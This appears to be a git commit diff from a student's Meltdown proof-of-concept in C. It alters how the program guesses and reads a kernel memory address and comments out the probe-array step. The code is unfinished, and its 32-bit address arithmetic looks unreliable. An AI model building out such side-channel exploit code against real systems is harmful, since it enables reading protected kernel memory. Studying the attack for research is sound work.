79838f0b256554e9efc9e5e4401637fab5e5fc30
Will Albers <walbers2@siebl-0224-14.ews.illinois.edu>
2019-03-02 14:18:02 -0600

    trying to get kernel address

--- meltdown-poc.c
+++ meltdown-poc.c
@@ -4,6 +4,8 @@
 
 //if you read array much larger than the l3 cache it should clear everything except that array
 
+#define GB *1073741824
+
 int getCacheSize() {
     puts("1");
 
@@ -28,10 +30,10 @@ void clearCache() {
 }
 
 
-
 int main() {
 
-    int first_thing_in_stack;
+    unsigned int num;
+
 
     // uint*_t should be one byte big
     uint8_t* probe_array = malloc(256 * 4096 * sizeof(uint8_t));
@@ -41,14 +43,15 @@ int main() {
     void *clearer = calloc(8, 1024*1024); // 8 MB
 
 
-    void * huh = ((void*)&first_thing_in_stack)-1024; 
-    uint8_t kernel_memory = *(uint8_t*) huh;
-    printf("First thing in stack: %p\n", &first_thing_in_stack);
-    printf("kernel memory: %p\n", huh);
+    void* task_size = ((((unsigned)&num) + 1 GB) / (1 GB)) GB; 
+    printf("task: %p\n", task_size);
+    uint8_t kernel_memory = *(uint8_t*)task_size;
+    //printf("First thing in stack: %p\n", &first_thing_in_stack);
+    //printf("kernel memory: %p\n", huh);
     printf("kernel memory data: %d\n", (int)kernel_memory); 
     
-    uint64_t final_kernel_memory = kernel_memory * 4096; // 4096 is page size?
-    uint8_t dummy = probe_array[final_kernel_memory];
+    //uint64_t final_kernel_memory = kernel_memory * 4096; // 4096 is page size?
+    //uint8_t dummy = probe_array[final_kernel_memory];
 
     // catch page fault
     // determine which of 256 slots in probe_array is cached
